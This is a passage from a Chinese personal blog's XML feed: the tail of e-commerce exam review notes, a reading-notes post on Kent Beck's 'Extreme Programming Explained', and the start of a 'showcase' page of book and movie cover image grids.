<li><p>B2B的优势：</p>
<ul>
<li>取代纸面单据，节约管理成本</li>
<li>加快运营速度，缩短循环周期</li>
<li>降低卖方搜索商品与供应商的成本和时间</li>
</ul>
</li>
<li><p>B2B的不足：</p>
<ul>
<li>渠道冲突</li>
<li>没有面对面交易的优势</li>
<li>对中间商不利</li>
</ul>
</li>
</ol>
<h4 id="电子交易所"><a href="#电子交易所" class="headerlink" title="电子交易所"></a>电子交易所</h4><ol>
<li>公共电子交易所：对所有感兴趣的参加者（销售商、采购商、业务伙伴）开放的交易场所</li>
<li>动态定价：指由于给定时间内供求关系原因，价格随时间快速变化</li>
<li>动态定价一般流程：<ul>
<li>某个企业为购买或销售一款商品出价或报价</li>
<li>启动一次拍卖活动</li>
<li>买方或卖方能看到出价或报价，但不知道出价或报价方</li>
<li>买卖双方实时沟通价格</li>
<li>买卖双方就价格达成一致</li>
<li>交易实施，安排支付和交货</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>电子商务</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>电子商务</tag>
      </tags>
  </entry>
  <entry>
    <title>《解析极限编程——拥抱变化》读书笔记</title>
    <url>/2025/02/21/%E8%A7%A3%E6%9E%90%E6%9E%81%E9%99%90%E7%BC%96%E7%A8%8B%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<h2 id="一、书名和作者"><a href="#一、书名和作者" class="headerlink" title="一、书名和作者"></a>一、书名和作者</h2><ul>
<li><strong>书名</strong>：《解析极限编程——拥抱变化》（<em>Extreme Programming Explained: Embrace Change</em>）</li>
<li><strong>作者</strong>：Kent Beck</li>
</ul>
<h2 id="二、书籍概览"><a href="#二、书籍概览" class="headerlink" title="二、书籍概览"></a>二、书籍概览</h2><ul>
<li><strong>主要论点和结构</strong><br>本书是极限编程（Extreme Programming，简称XP）领域的开山之作，书中提出了一种以“拥抱变化”为核心的软件开发方法论。全书结构清晰，主要分为概念介绍、核心实践、以及具体案例剖析三部分。通过理论与实践的结合，本书展示了XP如何通过短迭代、持续反馈、以及团队协作应对软件开发中的不确定性和复杂性。</li>
<li><strong>目标读者和应用场景</strong><br>本书适合从事敏捷开发、项目管理以及软件架构设计的开发者和管理者阅读，同时对希望改进团队协作与开发效率的开发团队具有启发意义。书中的思想既可以应用于小型敏捷团队，也能为传统开发模式的改进提供借鉴。</li>
</ul>
<span id="more"></span>

<h2 id="三、核心观点与主题总结"><a href="#三、核心观点与主题总结" class="headerlink" title="三、核心观点与主题总结"></a>三、核心观点与主题总结</h2><p>书中通过丰富的理论和实例阐述了极限编程的核心思想——“拥抱变化”。书中核心观点包括：</p>
<ol>
<li><p><strong>核心价值观</strong><br>XP倡导的核心价值观包括沟通、简单性、反馈、勇气和尊重。沟通强调团队间的高效信息共享；简单性提倡在设计中“只做必要的事情”；反馈通过频繁的用户和测试交互，确保开发的正确性；勇气要求开发者敢于迎接变化和解决难题；尊重则是团队成员之间信任与合作的基础。</p>
</li>
<li><p><strong>12项核心实践</strong><br>书中详细介绍了XP的12项核心实践，包括：</p>
<ul>
<li><p><strong>计划游戏</strong>：通过结合使用业务优先级和技术评估来快速确定下一个版本的范围。当计划赶不上实际变化的时就应更新计划。</p>
</li>
<li><p><strong>小版本</strong>：将一个简单系统迅速投产，然后以很短的周期发布新版本。</p>
</li>
<li><p><strong>隐喻</strong>：用有关整个系统如何运行的简单、众所周知的故事来指导所有开发。</p>
</li>
<li><p><strong>简单设计</strong>：任何时候都应当将系统设计得尽可能简单。不必要的复杂性一旦被发现就马上去掉。</p>
</li>
<li><p><strong>测试</strong>：程序员不断地编写单元测试，在这些测试能够无误地运行的情况下，开发才可以继续。客户编写测试来证明各功能已经完成。</p>
</li>
<li><p><strong>重构</strong>：程序员重新构造系统(而不更改其行为)以去除重复改善沟通、简化或提高柔性。</p>
</li>
<li><p><strong>结对编程</strong>：所有的生产代码都是由两个程序员在同一台计算机上编写的。</p>
</li>
<li><p><strong>集体所有权</strong>：任何人在任何时候都可以在系统中的任何位置更改任何代码。</p>
</li>
<li><p><strong>持续集成</strong>：每天多次集成和生成系统，每次都完成一项任务。</p>
</li>
<li><p><strong>每周工作 40 小时</strong>： 一般情况下，一周工作不超过 40) 小时。不要连续两个星期都加班。</p>
</li>
<li><p><strong>现场客户</strong>：在团队中加入一位真正的、起作用的用户，他将全职负责回答问题。</p>
</li>
<li><p><strong>编码标准</strong>：程序员依照强调通过代码沟通的规则来编写所有代码。</p>
</li>
</ul>
</li>
<li><p><strong>适应变化</strong><br>XP明确提出，变化是软件开发过程中的常态，而非例外。因此，开发团队应通过小步快跑和迭代反馈机制，主动适应客户需求的变动。通过持续交付和用户测试，XP能在开发周期内快速验证假设并调整方向，避免“交付时才发现方向错误”的高昂代价。</p>
</li>
<li><p><strong>以人为中心</strong><br>书中特别强调“以人为中心”的理念，开发者和客户都是核心利益相关者。XP要求团队间开放透明的沟通，通过每日站会、代码集体审查等方式，提升团队合作效率。</p>
</li>
</ol>
<h2 id="四、批评与局限性"><a href="#四、批评与局限性" class="headerlink" title="四、批评与局限性"></a>四、批评与局限性</h2><p>虽然《解析极限编程——拥抱变化》为软件开发提供了诸多有益的指导，但在实际应用中，XP也暴露出一些问题和局限性：</p>
<ol>
<li><strong>对小型团队的偏好</strong><br>书中几乎所有的理论和案例都围绕小型团队展开，这种轻量级方法对小团队确实非常有效，但在面对大型团队或跨地域协作时，XP的实践显得力不从心。例如，要求团队成员随时沟通在大规模团队中并不切实际，特别是在分布式团队中实现TDD和持续集成等实践会因沟通和工具限制而变得复杂。</li>
<li><strong>对文化和纪律的高要求</strong><br>XP的许多实践需要团队具备高度的纪律性和相互信任。例如，TDD对开发者的测试设计能力要求极高，计划游戏和用户故事则需要客户的全程参与。然而，许多团队或企业在文化和资源上无法满足这些要求，导致实践难以落地或流于形式。</li>
<li><strong>过于强调短期目标</strong><br>XP倡导小步快跑和持续交付，但这种短期视角可能导致对长期规划的忽视。例如，频繁的迭代开发可能导致团队对架构层面的长期优化缺乏关注，甚至会因快速交付需求而堆积技术债务。</li>
<li><strong>理论与实践的鸿沟</strong><br>尽管Kent Beck在书中提供了许多实践指南，但在实际项目中，如何选择并适配这些实践仍然是个难题。例如，企业项目可能因客户预算限制或技术约束，无法完全遵循书中的方法论，必须因地制宜地调整。</li>
</ol>
<p>因此XP虽然为开发团队提供了有效的工具，但需要根据实际情况谨慎采用，并结合其他方法论进行优化。</p>
<h2 id="五、感悟和思考"><a href="#五、感悟和思考" class="headerlink" title="五、感悟和思考"></a>五、感悟和思考</h2><p>阅读《解析极限编程——拥抱变化》让我重新思考了软件开发过程中的许多关键问题。我在课程项目中经常遇到需求不明确、沟通效率低的问题，而XP的“拥抱变化”理念正好为这些问题提供了新的解决思路。</p>
<p>XP的核心价值观让我深刻认识到开发团队协作的重要性。以往在团队项目中，我往往将代码质量和功能实现放在首位，却忽视了团队间的沟通和协作。XP通过每日站会、代码集体审查等方法，提醒我团队成员的共同努力才是项目成功的关键。</p>
<p>XP倡导的测试驱动开发和重构实践对我的编程习惯产生了很大影响。在以往的开发中，我总是倾向于“先写代码再调试”，而书中的案例证明，提前编写测试不仅能提高代码质量，还能有效减少后期维护的工作量。我计划在接下来的项目中尝试采用TDD模式，并定期进行代码重构，以提升自己的开发效率和代码规范意识。</p>
<p>我也意识到XP的实践并不总是适合所有场景。例如，书中的许多建议在时间充裕的小型项目中效果显著，但对资源有限、周期紧张的课程作业或企业项目来说，可能会因高额的前期投入而显得不切实际。因此，我认为需要灵活地选择性采用XP的实践，而不是一味地照本宣科。</p>
<p>总之，这本书带给我的不仅是技术上的启发，更让我对软件开发的核心问题有了更深入的思考。</p>
<h2 id="六、总结与评价"><a href="#六、总结与评价" class="headerlink" title="六、总结与评价"></a>六、总结与评价</h2><p>《解析极限编程——拥抱变化》是一本极具启发性的书籍，它通过清晰的逻辑和翔实的案例，为我们展示了如何以更敏捷、更高效的方式开发软件。Kent Beck以“拥抱变化”为核心，提出了许多创新性的方法论和实践，帮助团队在不确定性中找到方向。然而，XP的实际应用需要结合具体场景，团队也必须具备较高的纪律性和适应能力，这对读者提出了更高的要求。</p>
<p>对于希望改进团队协作和开发效率的从业者而言，本书无疑是一本值得研读的经典著作。即使不能全面应用XP，书中的理念和方法也能为实际工作提供许多有价值的参考。</p>
]]></content>
      <categories>
        <category>软件工程管理</category>
      </categories>
      <tags>
        <tag>软件工程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>欢迎光临</title>
    <url>/2024/12/22/%E6%A9%B1%E7%AA%97/</url>
    <content><![CDATA[<h1 id="🖼️橱窗"><a href="#🖼️橱窗" class="headerlink" title="🖼️橱窗"></a>🖼️橱窗</h1><p>欢迎来到我的橱窗！这里是我精心整理的各种有趣的内容，每一项都代表了我的兴趣与热爱。你可以在这里找到游戏推荐、书籍推荐等内容。</p>
<hr>
<h2 id="📚-书籍橱窗"><a href="#📚-书籍橱窗" class="headerlink" title="📚 书籍橱窗"></a>📚 书籍橱窗</h2><p>这里展示了我喜欢的书籍，以及值得推荐的阅读材料。不论是小说、非虚构作品，还是专业书籍，每一本书都有它的价值和思想深度。读书，不仅开拓视野，还能丰富内心世界，让思想更有深度。</p>
<div style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; padding: 20px; background-color: #f4e1d2;  border-radius: 12px;">
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/a657ceefa19d35d24773bb339d538ff9.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;  transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/0942e1b129052c761c6fdeef3c74f775.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/2521c80f6b416c6945785ebdafbe4437.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/d818b78fc43dad5c40da8e6212d8ee08.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/828dc38a12404602934e5b72643f0b10.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/e0a45a7f93df7ffb9ffad6303991a61d.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8c6adf84-4c72-42ef-a974-f04f47d402db.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/90f4dce14e12e9d4261209f1695cbeec.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/6b5568b4-fdeb-4cb4-a138-27411e636b90.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/83a69431a5bd12070991ed2f5a8c4055.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/fa1d18d87d104205b90d7e5817d17355.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/d184b34e5badd6ba1d04321a0f920825.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/dfc930d856bcd5bfa74a22d46bc8fe82.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/3ba1c42f72c265814f5f3306090a30f6.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/5070f96f-8205-4a58-9d27-961c3fbe5eae.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8e60e771c6bd211e389fa5d030ddce21.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/4c3af87b9fa0d8a7a9fcad12ef270863.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/976dd1fc65682bdafd1464d740cb5688.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/c87e82fb4db4f8f116dc946c96e81f5c.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/252d1811eb80092c3046d18a66ce364d.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/743d4f2458b5c28cb5ed7a8dcde74b8a.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/fe49a1e51ea8e89683e853d1728cd013.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/fd24ef8d-a221-4635-b108-410eda3fc5f5.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/cd55975dc8a06551b6e4b2b6bcfce9a7.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
    <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/c066129ebe5d91d1ab303ceb36c5fb70.png" style="width: 100%; height: auto; aspect-ratio: 2/3; object-fit: cover;    transition: transform 0.3s ease;"/>
</div>
----

<span id="more"></span>

<h2 id="📽️-电影橱窗"><a href="#📽️-电影橱窗" class="headerlink" title="📽️ 电影橱窗"></a>📽️ 电影橱窗</h2><p>这里是我的私人影单，涵盖了我最喜欢的电影和推荐的佳作。从经典大片到小众文艺，每一部电影都在光影中讲述动人故事。观影是一场心灵旅行，能让我们感受不同的人生，体会不一样的情感。</p>
<div style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; padding: 20px; background-color: #2d2d2d; border-radius: 12px;">
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/249b5c5b-25e7-4693-a187-0493304983ea.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/32564afb-5106-4dcf-b8a2-814cfa6c7f42.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/95948156-72cd-4401-8290-b78ad180751b.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/61d967e1-102e-4b9e-a2f1-1600cf61573f.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/67a967d7-066a-4846-8de2-282b1be61caa.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/27daa3ce-513e-49c5-a37d-4bbfb21c3d6d.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/d79e4b20-df20-43df-836f-39fe2db99254.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/1735042049110.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/28feab0d-1254-4e97-ad2f-da521ad2ecc8.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/fedd8f76-bf1b-4151-9f15-e47b950b72a5.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/20150115112144240399.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/20200831020517576761.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/b0e9e1dd-277a-443c-915d-507a873a4c52.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/ebd80b79-f43a-45c2-9664-f0a6c7820316.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/b2cb5ac5-d4f4-4206-9cc4-f4800505531c.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/b134003e-28d4-437a-b7a0-87408f300f79.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/47894cd5-1262-4303-a5ac-68898128f3d7.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/a31f2fe1-6b94-4161-9136-ce78a12903dd.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/20190703112905273096.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/2e8b4efa-c0a2-4305-b7f8-32ab899a742f.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/beeb747c-1b75-4b10-9433-138d5cc08625.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/48b65b17-d380-4972-bb3e-62abba66dfeb.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/ce88e52a-262e-45e6-a1a0-8e417b3ac6ab.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/20161213091029477656_watermark.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/2ab94476-3bf6-42ed-9671-0e6974433f9f.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8379ed6c-224a-4e88-8e18-bc77c64cb9cc.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/b119ad50-8d53-4948-8c42-931b9de1fe2a.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/012720a1-5d05-4d31-9fae-4b3123751642.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/da506f48-a534-42ca-ac0a-6d7e9b98ad2c.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/31bfeee2-64a7-42fd-97c1-edec0d166ac9.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/847d4be4-7144-406d-a454-1f766eca116a.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/992013fd-1ee7-423b-b552-30c4dfc41d6a.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/5607d9ec-35b5-41af-bf2f-e444257bd918.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/65998cbd-3672-4467-9183-f68867f9d345.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/56236858-dc10-424d-83d6-9917f82855cb.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/407a624d-fa05-4efc-abd9-862e5b4da9b5.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/f9aff3b1-5697-498e-b514-18c69271364b.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/8690c734-9f08-42a4-8e01-ad720b7ba0d5.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/6deea819-8c81-4e5e-8ac8-ca5632f1c08b.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/5fe6ee0e-44a3-487d-93ff-634145f67c40.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/149547972.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/1054341791.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/e55f2d0d-a89d-4fa2-ba1c-08d81180b38a.png" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/thumb_1_327_450_20121116041421545.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
  <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/thumb_1_327_450_20131106102648144971.jpg" style="width: 100%; height: 300px; object-fit: cover; border-radius: 12px; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); transition: transform 0.3s ease;"/>
</div>



<hr>
<h2 id="🎮-游戏橱窗"><a href="#🎮-游戏橱窗" class="headerlink" title="🎮 游戏橱窗"></a>🎮 游戏橱窗</h2><p>这里陈列了我最爱的游戏，既有趣味性又富有创意，展现了游戏作为第九艺术的魅力。无论是沉浸式剧情，还是爽快的玩法，每一款游戏都能带来独特的体验。游戏不仅放松身心，还能激发想象力和创造力。</p>
<div style="background-color: #1b2838; padding: 20px; border-top-left-radius: 12px; border-top-right-radius: 12px; border-bottom-left-radius: 0; border-bottom-right-radius: 0; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);">
  <div style="display: flex; justify-content: space-between; align-items: center; gap: 10px;">
